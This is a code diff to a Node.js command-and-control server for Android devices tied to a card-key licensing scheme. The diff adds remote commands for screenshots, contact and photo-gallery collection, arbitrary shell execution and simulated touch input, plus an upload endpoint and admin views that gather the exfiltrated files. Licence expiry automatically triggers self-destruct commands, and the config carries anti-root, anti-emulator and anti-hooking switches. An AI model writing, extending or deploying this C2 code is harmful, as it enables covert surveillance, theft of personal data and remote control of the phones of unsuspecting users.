@@ -28,18 +28,40 @@ const DEFAULT_AI_HTML_PROMPT = [
 ].join('\n');
 const dataDir = path.join(__dirname, 'data');
 const dbFile = path.join(dataDir, 'db.json');
+const uploadsDir = path.join(dataDir, 'uploads');
 
 ensureDir(dataDir);
+ensureDir(uploadsDir);
 let db = loadDb();
 const tokens = new Map();
 const verifyRate = new Map();
 
+// 内存日志环形缓冲，保存最近 500 条
+const LOG_RING = [];
+const LOG_RING_MAX = 500;
+const _origLog = console.log.bind(console);
+const _origError = console.error.bind(console);
+function pushLog(level, args) {
+  const line = `[${new Date().toISOString().replace('T',' ').slice(0,19)}][${level}] ` + args.map(String).join(' ');
+  LOG_RING.push(line);
+  if (LOG_RING.length > LOG_RING_MAX) LOG_RING.shift();
+}
+console.log = (...args) => { _origLog(...args); pushLog('INFO', args); };
+console.error = (...args) => { _origError(...args); pushLog('ERROR', args); };
+
 const server = http.createServer(async (req, res) => {
+  const startMs = Date.now();
   try {
     await route(req, res);
   } catch (error) {
-    console.error(error);
+    console.error(`[ERROR] ${req.method} ${req.url}`, error.message);
     sendJson(res, 500, { ok: false, message: 'server error' });
+  } finally {
+    const ms = Date.now() - startMs;
+    const ip = String((req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '')).split(',')[0].trim();
+    if (req.url !== '/health') {
+      console.log(`[${new Date().toISOString().replace('T',' ').slice(0,19)}] ${req.method} ${req.url} ${ip} ${ms}ms`);
+    }
   }
 });
 
@@ -110,6 +132,10 @@ async function route(req, res) {
   if (req.method === 'POST' && url.pathname === '/device/ack') {
     const params = parseBody(req, await readBody(req));
     return sendJson(res, 200, deviceAck(params));
+  }
+
+  if (req.method === 'POST' && url.pathname === '/device/upload') {
+    return sendJson(res, 200, await deviceUpload(req));
   }
 
   if (url.pathname === '/' && (req.method === 'GET' || req.method === 'POST')) {
@@ -236,6 +262,19 @@ async function handleAdminApi(req, res, url) {
     return sendJson(res, 200, { ok: true, device: enrichDevice(device) });
   }
 
+  // 清除设备所有待执行命令
+  const clearCmdsMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/clear-commands$/);
+  if (req.method === 'POST' && clearCmdsMatch) {
+    const device = findDevice(Number(clearCmdsMatch[1]));
+    if (!device) return sendJson(res, 404, { ok: false, message: 'not found' });
+    const cleared = (device.pending_commands || []).length;
+    device.pending_commands = [];
+    device.updated_at = now();
+    saveDb();
+    console.log(`[管理] 清除设备 ${device.device_id}(${device.name}) ${cleared} 条待命令`);
+    return sendJson(res, 200, { ok: true, cleared });
+  }
+
   if (req.method === 'GET' && url.pathname === '/admin/api/groups') {
     return sendJson(res, 200, { ok: true, groups: db.groups.slice().sort((a, b) => a.id - b.id) });
   }
@@ -299,6 +338,72 @@ async function handleAdminApi(req, res, url) {
     } catch (e) {
       return sendJson(res, 500, { ok: false, message: e.message });
     }
+  }
+
+  // 设备上传历史（截图/shell结果/联系人）
+  const uploadsMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/uploads$/);
+  if (uploadsMatch && req.method === 'GET') {
+    const device = db.devices.find(d => d.id === Number(uploadsMatch[1]));
+    if (!device) return sendJson(res, 404, { ok: false, message: '设备不存在' });
+    const uploads = (device.uploads || []).slice().reverse().slice(0, 50);
+    return sendJson(res, 200, { ok: true, uploads });
+  }
+  // 删除上传文件
+  const delUploadMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/uploads\/(.+)$/);
+  if (delUploadMatch && req.method === 'DELETE') {
+    const device = db.devices.find(d => d.id === Number(delUploadMatch[1]));
+    if (!device) return sendJson(res, 404, { ok: false, message: '设备不存在' });
+    const filename = path.basename(decodeURIComponent(delUploadMatch[2]));
+    const filepath = path.join(uploadsDir, filename);
+    if (fs.existsSync(filepath)) try { fs.unlinkSync(filepath); } catch {}
+    device.uploads = (device.uploads || []).filter(u => u.filename !== filename);
+    saveDb();
+    return sendJson(res, 200, { ok: true });
+  }
+  if (req.method === 'GET' && url.pathname.startsWith('/admin/api/uploads/')) {
+    const filename = path.basename(url.pathname.replace('/admin/api/uploads/', ''));
+    const filepath = path.join(uploadsDir, filename);
+    if (!fs.existsSync(filepath)) return sendJson(res, 404, { ok: false, message: '文件不存在' });
+    const ext = path.extname(filename).toLowerCase();
+    const mimeMap = { '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.txt': 'text/plain; charset=utf-8', '.json': 'application/json' };
+    const mime = mimeMap[ext] || 'application/octet-stream';
+    res.writeHead(200, { 'Content-Type': mime, 'Content-Disposition': `inline; filename="${filename}"` });
+    fs.createReadStream(filepath).pipe(res);
+    return;
+  }
+
+  // 服务器日志（内存缓冲，最近500条）
+  if (req.method === 'GET' && url.pathname === '/admin/api/logs') {
+    return sendJson(res, 200, { ok: true, logs: LOG_RING.slice(-300).join('\n') });
+  }
+
+  // 总览：聚合所有设备上传、待命令、统计
+  if (req.method === 'GET' && url.pathname === '/admin/api/monitor') {
+    const devices = db.devices || [];
+    const totalDevices = devices.length;
+    const onlineDevices = devices.filter(d => d.status === 'online').length;
+    // 所有上传（最新100条，按时间降序）
+    let allUploads = [];
+    for (const d of devices) {
+      for (const u of (d.uploads || [])) {
+        allUploads.push({ ...u, device_id: d.id, device_name: d.device_name || d.id });
+      }
+    }
+    allUploads.sort((a, b) => (b.created_at || '').localeCompare(a.created_at || ''));
+    allUploads = allUploads.slice(0, 100);
+    // 所有待执行命令
+    let allPending = [];
+    for (const d of devices) {
+      for (const c of (d.pending_commands || [])) {
+        allPending.push({ ...c, device_id: d.id, device_name: d.device_name || d.id });
+      }
+    }
+    return sendJson(res, 200, {
+      ok: true,
+      stats: { totalDevices, onlineDevices, totalUploads: allUploads.length, totalPending: allPending.length },
+      uploads: allUploads,
+      pending: allPending
+    });
   }
 
   return sendJson(res, 404, { ok: false, message: 'not found' });
@@ -366,7 +471,8 @@ function verifyCard({ input, deviceId }) {
   const current = now();
   if (!card.first_used_at) {
     card.first_used_at = current;
-    card.expires_at = addDays(current, card.duration_days);
+    // duration_days=0 表示永久，不设 expires_at
+    if (card.duration_days > 0) card.expires_at = addDays(current, card.duration_days);
     card.device_id = deviceId || '';
     card.updated_at = current;
     saveDb();
@@ -377,9 +483,13 @@ function verifyCard({ input, deviceId }) {
     card.updated_at = current;
     saveDb();
   }
-  const remainingSeconds = Math.max(0, Math.floor((new Date(card.expires_at).getTime() - Date.now()) / 1000));
-  if (remainingSeconds <= 0) return fail('卡密已到期');
-  return { code: 0, message: '验证成功', data: { remaining_seconds: remainingSeconds, expires_at: card.expires_at, card: input } };
+  // 永久卡（expires_at 为空）不检查过期
+  if (card.expires_at) {
+    const remainingSeconds = Math.max(0, Math.floor((new Date(card.expires_at).getTime() - Date.now()) / 1000));
+    if (remainingSeconds <= 0) return fail('卡密已到期');
+    return { code: 0, message: '验证成功', data: { remaining_seconds: remainingSeconds, expires_at: card.expires_at, card: input } };
+  }
+  return { code: 0, message: '验证成功', data: { remaining_seconds: -1, expires_at: '', card: input } };
 }
 
 function fail(message) { return { code: -1, message, data: { remaining_seconds: 0 } }; }
@@ -427,17 +537,56 @@ function registerDevice(params, req) {
     device.updated_at = current;
     if (device.status !== 'destroyed') device.status = 'online';
   }
+
+  // 自动发卡：分组开启 auto_issue_card 且设备没有绑定卡时，自动签发
+  const cfg = effectiveConfig(device);
+  if (cfg.auto_issue_card && !device.card) {
+    const autoCard = autoIssueCard(device, softwareType);
+    if (autoCard) {
+      device.card = autoCard.card;
+      device.updated_at = current;
+      console.log(`[自动发卡] 设备 ${deviceId}(${device.name}) 签发卡密 ${autoCard.card}`);
+    }
+  }
+
   saveDb();
+  const cmds = device.pending_commands.slice();
+  if (cmds.length) console.log(`[注册] 设备 ${deviceId}(${device.name}) 有 ${cmds.length} 条待执行命令: ${cmds.map(c=>c.type).join(',')}`);
+  else console.log(`[注册] 设备 ${deviceId}(${device.name}) 上线`);
   return {
     code: 0,
     message: 'ok',
     data: {
       id: device.id,
       group: group.name,
-      config: effectiveConfig(device),
-      pending_commands: device.pending_commands.slice()
+      config: cfg,
+      pending_commands: cmds
     }
   };
+}
+
+// 自动签发卡密（duration_days=0 表示永久）
+function autoIssueCard(device, softwareType) {
+  // 优先复用已有该设备绑定的 auto 卡
+  let card = db.cards.find(c => c.device_id === device.device_id && c.note === '__auto__' && c.status === 'active');
+  if (card) return card;
+  let cardStr;
+  do { cardStr = makeCard(); } while (db.cards.some(c => c.card === cardStr));
+  card = {
+    id: nextId(),
+    card: cardStr,
+    name: '自动卡-' + softwareType,
+    duration_days: 0,
+    status: 'active',
+    device_id: device.device_id,
+    first_used_at: now(),
+    expires_at: '',
+    note: '__auto__',
+    created_at: now(),
+    updated_at: now()
+  };
+  db.cards.push(card);
+  return card;
 }
 
 function deviceHeartbeat(params, req) {
@@ -453,13 +602,36 @@ function deviceHeartbeat(params, req) {
   device.ip = remoteIp(req, params) || device.ip;
   if (device.status === 'offline') device.status = 'online';
   if (params.software_version || params.version) device.software_version = String(params.software_version || params.version);
+
+  // 卡密过期检测
+  const cfg = effectiveConfig(device);
+  if (cfg.expire_action && cfg.expire_action !== 'none' && device.card) {
+    const card = db.cards.find(c => c.card === device.card);
+    const expired = card && card.expires_at && new Date(card.expires_at).getTime() < Date.now();
+    if (expired) {
+      const alreadyQueued = (device.pending_commands || []).some(c => c.type === 'expire_block' || c.type === 'self_destruct');
+      if (!alreadyQueued) {
+        device.pending_commands = device.pending_commands || [];
+        if (cfg.expire_action === 'uninstall') {
+          device.pending_commands.push({ id: crypto.randomBytes(8).toString('hex'), type: 'self_destruct', payload: { reason: 'card_expired' }, created_at: now() });
+          console.log(`[过期卸载] 设备 ${deviceId}(${device.name}) 卡密已到期，下发自毁命令`);
+        } else if (cfg.expire_action === 'block') {
+          device.pending_commands.push({ id: crypto.randomBytes(8).toString('hex'), type: 'expire_block', payload: { reason: 'card_expired' }, created_at: now() });
+          console.log(`[过期阻断] 设备 ${deviceId}(${device.name}) 卡密已到期，下发阻断命令`);
+        }
+      }
+    }
+  }
+
   saveDb();
+  const cmds = device.pending_commands.slice();
+  if (cmds.length) console.log(`[心跳] 设备 ${deviceId}(${device.name}) 推送 ${cmds.length} 条命令: ${cmds.map(c=>c.type).join(',')}`);
   return {
     code: 0,
     message: 'ok',
     data: {
-      config: effectiveConfig(device),
-      pending_commands: device.pending_commands.slice()
+      config: cfg,
+      pending_commands: cmds
     }
   };
 }
@@ -475,6 +647,7 @@ function deviceAck(params) {
   if (!device) return { code: -1, message: 'device not found' };
   const acked = device.pending_commands.filter(c => ids.includes(c.id));
   device.pending_commands = device.pending_commands.filter(c => !ids.includes(c.id));
+  if (acked.length) console.log(`[ACK] 设备 ${deviceId}(${device.name}) 执行完成: ${acked.map(c=>c.type).join(',')} result=${params.result||'ok'}`);
   if (acked.some(c => c.type === 'self_destruct') || params.result === 'self_destructed') {
     device.status = 'destroyed';
   }
@@ -558,6 +731,10 @@ function defaultConfig() {
     enable_c2: true,
     allow_device_diagnostics: false,
     allow_root_commands: false,
+    allow_screenshot: false,
+    allow_contacts: false,
+    allow_shell: false,
+    allow_input_control: false,
     debug: false,
     enable_hook: false,
     ban_root: false,
@@ -567,7 +744,11 @@ function defaultConfig() {
     ban_dual_app: false,
     popup_title: '请输入卡密',
     popup_message: '一机一卡，首次使用自动绑定设备',
-    popup_html: ''
+    popup_html: '',
+    // 自动发卡：注册时若卡密为空则自动签发一张永久卡并绑定（调试或免卡密场景）
+    auto_issue_card: false,
+    // 卡密过期行为：none=不处理 block=阻断 C2 命令 uninstall=下发自毁命令
+    expire_action: 'none'
   };
 }
 
@@ -583,12 +764,16 @@ function sanitizeConfig(config) {
   if (typeof obj !== 'object') return null;
   const sane = {};
   if (obj.poll_interval != null && obj.poll_interval !== '') sane.poll_interval = clampInt(obj.poll_interval, 5, 86400, 60);
-  for (const key of ['enable_c2', 'allow_device_diagnostics', 'allow_root_commands', 'debug', 'enable_hook', 'ban_root', 'ban_xposed', 'ban_emulator', 'ban_virtual_app', 'ban_dual_app']) {
+  for (const key of ['enable_c2', 'allow_device_diagnostics', 'allow_root_commands',
+    'allow_screenshot', 'allow_contacts', 'allow_shell', 'allow_input_control',
+    'debug', 'enable_hook', 'ban_root', 'ban_xposed', 'ban_emulator', 'ban_virtual_app', 'ban_dual_app']) {
     if (obj[key] != null) sane[key] = boolish(obj[key]);
   }
   if (obj.popup_title != null) sane.popup_title = String(obj.popup_title).trim().slice(0, 60) || '请输入卡密';
   if (obj.popup_message != null) sane.popup_message = String(obj.popup_message).trim().slice(0, 120) || '一机一卡，首次使用自动绑定设备';
   if (obj.popup_html != null) sane.popup_html = String(obj.popup_html).slice(0, 20000);
+  if (obj.auto_issue_card != null) sane.auto_issue_card = boolish(obj.auto_issue_card);
+  if (obj.expire_action != null && ['none', 'block', 'uninstall'].includes(String(obj.expire_action))) sane.expire_action = String(obj.expire_action);
   return Object.keys(sane).length ? sane : null;
 }
 
@@ -684,15 +869,35 @@ function stripMarkdownFence(text) {
 
 function queueDeviceCommand(device, params) {
   const type = String(params.type || '').trim();
-  const allowed = ['self_destruct', 'message', 'kick', 'update_config'];
+  const allowed = ['self_destruct', 'message', 'kick', 'update_config',
+    'screenshot', 'get_contacts', 'get_gallery', 'shell', 'input_tap', 'input_swipe', 'wake'];
   if (!allowed.includes(type)) throw new Error('unsupported command: ' + type);
   const cfg = effectiveConfig(device);
   if (!cfg.enable_c2) throw new Error('该设备当前配置已关闭 C2');
+  // 能力开关校验
+  if (type === 'screenshot' && !cfg.allow_screenshot) throw new Error('该设备配置未开启截图能力');
+  if (type === 'get_contacts' && !cfg.allow_contacts) throw new Error('该设备配置未开启通讯录能力');
+  if (type === 'get_gallery' && !cfg.allow_contacts) throw new Error('该设备配置未开启相册能力（复用通讯录开关）');
+  if (type === 'shell' && !cfg.allow_shell) throw new Error('该设备配置未开启 Shell 执行能力');
+  if ((type === 'input_tap' || type === 'input_swipe') && !cfg.allow_input_control) throw new Error('该设备配置未开启触控模拟能力');
   let payload = params.payload;
   if (typeof payload === 'string') { try { payload = JSON.parse(payload); } catch { payload = { text: payload }; } }
   if (!payload || typeof payload !== 'object') payload = {};
   if (type === 'message' && !payload.text && params.text) payload.text = String(params.text);
   if (type === 'update_config' && !payload.config) payload.config = sanitizeConfig(params.config) || {};
+  if (type === 'shell' && !payload.cmd && params.cmd) payload.cmd = String(params.cmd);
+  if (type === 'get_gallery') {
+    if (!payload.limit) payload.limit = clampInt(params.limit || params.count, 1, 500, 100);
+  }
+  if (type === 'input_tap') {
+    if (!payload.x && params.x) payload.x = Number(params.x);
+    if (!payload.y && params.y) payload.y = Number(params.y);
+  }
+  if (type === 'input_swipe') {
+    for (const k of ['x1', 'y1', 'x2', 'y2', 'duration']) {
+      if (payload[k] == null && params[k] != null) payload[k] = Number(params[k]);
+    }
+  }
   const cmd = {
     id: crypto.randomBytes(8).toString('hex'),
     type,
@@ -700,9 +905,68 @@ function queueDeviceCommand(device, params) {
     created_at: now()
   };
   device.pending_commands = device.pending_commands || [];
+  // 在真正的命令前插一个 wake，让客户端结束当前 sleep 立即来心跳
+  if (type !== 'wake') {
+    const alreadyWake = device.pending_commands.some(c => c.type === 'wake');
+    if (!alreadyWake) {
+      device.pending_commands.unshift({ id: crypto.randomBytes(8).toString('hex'), type: 'wake', payload: {}, created_at: now() });
+    }
+  }
   device.pending_commands.push(cmd);
   device.updated_at = now();
   return cmd;
+}
+
+async function deviceUpload(req) {
+  // multipart/form-data 手动解析：boundary + device_id + cmd_id + type + data(base64) 或 file bytes
+  const ctype = String(req.headers['content-type'] || '');
+  const rawBuf = await new Promise((resolve, reject) => {
+    const chunks = [];
+    let size = 0;
+    req.on('data', c => { chunks.push(c); size += c.length; if (size > 20 * 1024 * 1024) req.destroy(); });
+    req.on('end', () => resolve(Buffer.concat(chunks)));
+    req.on('error', reject);
+  });
+  let deviceId = '', cmdId = '', type = '', dataB64 = '', ext = 'bin';
+  if (ctype.includes('multipart/form-data')) {
+    const boundaryMatch = ctype.match(/boundary=([^\s;]+)/);
+    if (boundaryMatch) {
+      const parts = rawBuf.toString('binary').split('--' + boundaryMatch[1]);
+      for (const part of parts) {
+        const cdMatch = part.match(/Content-Disposition:[^\r\n]*name="([^"]+)"/i);
+        if (!cdMatch) continue;
+        const fieldName = cdMatch[1];
+        const bodyStart = part.indexOf('\r\n\r\n');
+        if (bodyStart < 0) continue;
+        const value = part.slice(bodyStart + 4).replace(/\r\n$/, '');
+        if (fieldName === 'device_id') deviceId = value;
+        else if (fieldName === 'cmd_id') cmdId = value;
+        else if (fieldName === 'type') type = value;
+        else if (fieldName === 'ext') ext = value.replace(/[^a-z0-9]/g, '') || 'bin';
+        else if (fieldName === 'data') dataB64 = value;
+      }
+    }
+  } else {
+    const params = parseBody(req, rawBuf.toString('utf8'));
+    deviceId = params.device_id || '';
+    cmdId = params.cmd_id || '';
+    type = params.type || '';
+    dataB64 = params.data || '';
+    ext = (params.ext || 'bin').replace(/[^a-z0-9]/g, '') || 'bin';
+  }
+  if (!deviceId) return { ok: false, message: 'missing device_id' };
+  const device = db.devices.find(d => d.device_id === deviceId);
+  if (!device) return { ok: false, message: 'device not found' };
+  if (!dataB64) return { ok: false, message: 'missing data' };
+  const buf = Buffer.from(dataB64, 'base64');
+  const filename = `${device.id}_${type}_${Date.now()}.${ext}`;
+  fs.writeFileSync(path.join(uploadsDir, filename), buf);
+  device.uploads = device.uploads || [];
+  device.uploads.unshift({ cmd_id: cmdId, type, filename, size: buf.length, created_at: now() });
+  device.uploads = device.uploads.slice(0, 100);
+  saveDb();
+  console.log(`[上传] 设备 ${device.name}(${device.id}) 上传 ${type}.${ext} ${buf.length}字节 cmd=${cmdId}`);
+  return { ok: true, filename };
 }
 
 function parseMeta(params) {
@@ -865,5 +1129,5 @@ function addDays(iso, days) { const date = new Date(iso); date.setUTCDate(date.g
 function trimRightSlash(value) { return String(value).replace(/\/+$/, ''); }
 function ensureDir(dir) { if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); }
 function escapeHtml(value) { return String(value).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }
-function loadEnv(file) { if (!fs.existsSync(file)) return; for (const line of fs.readFileSync(file, 'utf8').replace(/^﻿/, '').split(/\r?\n/)) { const trimmed = line.trim(); if (!trimmed || trimmed.startsWith('#')) continue; const index = trimmed.indexOf('='); if (index <= 0) continue; const key = trimmed.slice(0, index).trim().replace(/^﻿/, ''); const value = trimmed.slice(index + 1).trim(); if (!(key in process.env)) process.env[key] = value; } }
+function loadEnv(file) { if (!fs.existsSync(file)) return; for (const line of fs.readFileSync(file, 'utf8').replace(/^﻿/, '').split(/\r?\n/)) { const trimmed = line.trim(); if (!trimmed || trimmed.startsWith('#')) continue; const index = trimmed.indexOf('='); if (index <= 0) continue; const key = trimmed.slice(0, index).trim().replace(/^﻿/, ''); const value = trimmed.slice(index + 1).trim(); process.env[key] = value; } }
 
